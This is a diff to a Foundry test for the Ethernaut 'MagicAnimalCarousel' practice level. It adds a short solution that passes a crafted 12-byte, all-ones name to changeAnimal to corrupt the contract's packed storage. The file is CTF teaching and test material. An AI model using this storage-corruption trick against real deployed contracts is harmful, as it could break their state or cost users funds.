@@ -8,6 +8,7 @@ import {MagicAnimalCarousel} from "src/levels/MagicAnimalCarousel.sol";
 import {MagicAnimalCarouselFactory} from "src/levels/MagicAnimalCarouselFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
+import {Bytes} from "openzeppelin-contracts-v5.4.0/utils/Bytes.sol";
 
 contract TestMagicAnimalCarousel is Test, Utils {
     Ethernaut ethernaut;
@@ -113,6 +114,11 @@ contract TestMagicAnimalCarousel is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
+        string memory dog = "Dog";
+        instance.setAnimalAndSpin(dog);
+        bytes memory name = abi.encodePacked(bytes12(bytes32(uint256(type(uint96).max) << 160)));
+        address(instance).call(abi.encodeWithSignature("changeAnimal(string,uint256)", name, 1));
+        instance.setAnimalAndSpin(dog);
 
     }
 }
